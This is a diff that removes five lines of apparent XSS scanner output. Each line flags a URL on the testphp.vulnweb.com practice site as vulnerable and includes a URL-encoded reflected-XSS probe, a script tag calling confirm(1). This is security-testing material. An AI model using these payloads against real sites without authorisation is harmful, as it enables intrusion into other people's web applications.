@@ -1,5 +1,0 @@
-[31m[-] Vulnerable To Xss[0m : http://testphp.vulnweb.com:80/hpp/index.php?pp=%22%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
-[31m[-] Vulnerable To Xss[0m : http://testphp.vulnweb.com:80/hpp/?pp=%22%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
-[31m[-] Vulnerable To Xss[0m : http://testphp.vulnweb.com:80/listproducts.php?cat=%22%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
-[31m[-] Vulnerable To Xss[0m : http://testphp.vulnweb.com/listproducts.php?artist=%22%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
-[31m[-] Vulnerable To Xss[0m : http://testphp.vulnweb.com/showimage.php?file=%22%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
